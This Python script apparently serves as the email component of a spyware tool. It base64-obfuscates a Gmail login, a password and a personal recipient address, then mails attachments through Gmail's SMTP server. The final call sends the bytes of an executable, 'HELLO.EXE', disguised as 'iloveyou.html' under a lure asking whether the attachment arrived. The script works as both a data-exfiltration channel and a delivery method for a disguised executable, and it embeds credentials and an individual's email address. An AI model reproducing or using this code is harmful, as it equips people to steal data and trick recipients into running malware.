import smtplib
import base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def sender(BodyText,attach_filename,recived_attachments):
    senderemail=base64.b64decode('c3B5Zm91cGRhdG9yQGdtYWlsLmNvbQ==').decode('utf-8')
    senderpass=base64.b64decode('c3B5Zm91cGRhdG9yeHh4eA==').decode('utf-8')
    recivermail=base64.b64decode('YW5pc2guZGhha2FsLmFkLmFkMTVAZ21haWwuY29t').decode('utf-8')
        



    msg=MIMEMultipart()
    msg['From']=senderemail
    msg['To']=recivermail
    msg['Subject']='Subject'
    body=BodyText
    msg.attach(MIMEText(body,'plain'))

    if(attach_filename=="NULL" and recived_attachments=="NULL"):
        msg=msg.as_string()
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(senderemail,senderpass)
        server.sendmail(senderemail,recivermail,msg)
        server.close()
    
    else:
        part =MIMEBase('application','octet-stream')
        part.set_payload(recived_attachments)
        encoders.encode_base64(part)
        part.add_header("Content-Disposition","attachment; filename= "+attach_filename)
        msg.attach(part)

        msg=msg.as_string()
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(senderemail,senderpass)
        server.sendmail(senderemail,recivermail,msg)
        server.close()
file=open('HELLO.EXE','rb')
byte=file.read()
file.close()
#sender("Hello","NULL","NULL")
sender("Hello, Did you receive attachment?","iloveyou.html",byte)
